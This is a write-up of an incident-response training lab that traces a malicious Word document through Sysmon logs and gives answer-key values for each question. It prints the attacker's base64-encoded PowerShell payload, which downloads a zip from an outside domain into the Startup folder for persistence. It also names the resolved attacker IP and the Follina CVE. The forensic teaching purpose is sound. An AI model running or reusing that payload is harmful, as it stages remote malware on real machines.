Tempest Incident

In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a **CRITICAL** severity that needs further investigation.

As reported by the <span style="color: #d4d0ca;">SOC</span> analyst, the intrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:

- The malicious document has a **.doc** extension.
- The user downloaded the malicious document via **chrome.exe**.
- The malicious document then executed a chain of commands to attain code execution.

Investigation Guide

To aid with the investigation, you may refer to the cheatsheet crafted by the team applicable to this scenario:

- Start with the events generated by <span style="color: #d4d0ca;">Sysmon</span>.
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret <span style="color: #d4d0ca;">Sysmon</span> logs.
- Follow the child processes of WinWord.exe.
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and <span style="color: #d4d0ca;">DNS</span> Queries (Event ID 22) to correlate the activity generated by the malicious document.

Significant Data Sources:

- <span style="color: #d4d0ca;">Sysmon</span>

Answer the questions below

The user of this machine was compromised by a malicious document. What is the file name of the document?

![image](https://github.com/user-attachments/assets/17fc0972-bf5c-453e-a0a2-c9c45b54d531)

ANS: free_magicules.doc

What is the name of the compromised user and machine?

*Format: username-machine name*

![image](https://github.com/user-attachments/assets/f8b59666-3a96-4a54-a7fd-d36af10205e2)



ANS: benimaru-TEMPEST

What is the PID of the Microsoft Word process that opened the malicious document?

Filter all use of "free_magicules.doc" and look for event id 1 (process creation)

![image](https://github.com/user-attachments/assets/bd34230f-af1a-471c-a8f1-ce9f7b5deb76)


ANS: 496

Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

Take note of the record number

![image](https://github.com/user-attachments/assets/0aa2c51d-9aa6-4a0d-a39d-6bdd8e11f0ac)


With filter process id 496 (winword.exe). From the record number and moving forward event id 1 (process creation) event id 13 (registry event)  event id 11 (fire create) event id 3 (Network connection) event id 15 (FileCreateStreamHash) event id 22 (DNS event). All of which from user benimaru.

![image](https://github.com/user-attachments/assets/af2145b5-e640-4300-a3eb-4579cbcbd8d8)


Looking through the event id 3 and 22

![image](https://github.com/user-attachments/assets/3a2185e8-c362-4f4d-9b19-678d05c15053)


ANS: 167.71.199.191

What is the base64 encoded string in the malicious payload executed by the document?

We know that the process id that opened the malicious file is 496. Now we have to look for any child process it has created by filtering it as a parent process id. In this case, it's on "Payload Data5" column

![image](https://github.com/user-attachments/assets/5a23f57a-4462-4e7a-84ca-5db8d1aa38a1)


ANS: JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

*Format: XXXX-XXXXX*

After searching around we found this in lolbas

![image](https://github.com/user-attachments/assets/0e313d89-df2a-4dff-8e41-c5c31ece67a3)


ANS: 2022-30190
